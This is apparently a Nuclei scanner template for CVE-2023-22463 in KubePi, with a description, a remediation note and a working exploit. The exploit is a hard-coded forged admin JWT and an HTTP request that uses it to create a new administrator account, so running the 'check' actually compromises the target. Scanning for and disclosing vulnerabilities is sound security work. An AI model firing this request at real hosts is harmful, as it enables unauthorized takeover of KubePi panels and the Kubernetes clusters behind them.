id: CVE-2023-22463

info:
  name: KubePi JwtSigKey - Login Bypass
  author: DhiyaneshDK
  severity: critical
  description: |
    KubePi is a k8s panel. The jwt authentication function of KubePi through version 1.6.2 uses hard-coded Jwtsigkeys, resulting in the same Jwtsigkeys for all online projects. This means that an attacker can forge any jwt token to take over the administrator account of any online project. Furthermore, they may use the administrator to take over the k8s cluster of the target enterprise. `session.go`, the use of hard-coded JwtSigKey, allows an attacker to use this value to forge jwt tokens arbitrarily. The JwtSigKey is confidential and should not be hard-coded in the code.
  remediation: The vulnerability has been fixed in 1.6.3. In the patch, JWT key is specified in app.yml. If the user leaves it blank, a random key will be used. There are no workarounds aside from upgrading.
  reference:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/KubePi/KubePi%20JwtSigKey%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2023-22463.md
    - https://nvd.nist.gov/vuln/detail/CVE-2023-22463
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-22463
    cwe-id: CWE-798
    epss-score: 0.00065
    epss-percentile: 0.26993
    cpe: cpe:2.3:a:fit2cloud:kubepi:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: fit2cloud
    product: kubepi
    shodan-query: html:"kubepi"
    fofa-query: "kubepi"
  tags: cve,cve2023,kubepi,k8s,auth-bypass

variables:
  name: "{{rand_base(6)}}"
  password: "{{rand_base(8)}}"
  email: "{{randstr}}@{{rand_base(5)}}.com"
  nickname: "{{rand_base(4)}}"
  token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8"

http:
  - raw:
      - |
        POST /kubepi/api/v1/users HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/105.0.5195.127 Safari/537.36
        Accept: application/json
        Accept-Encoding: gzip, deflate
        Authorization: Bearer {{token}}

        {
          "authenticate": {
               "password": "{{password}}"
          },
          "email": "{{email}}",
          "isAdmin": true,
          "mfa": {
                  "enable": false
           },
          "name": "{{name}}",
          "nickName": "{{nickname}}",
          "roles": [
          ]
        }

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"password":'
          - '"isAdmin":'
        condition: and

      - type: word
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200
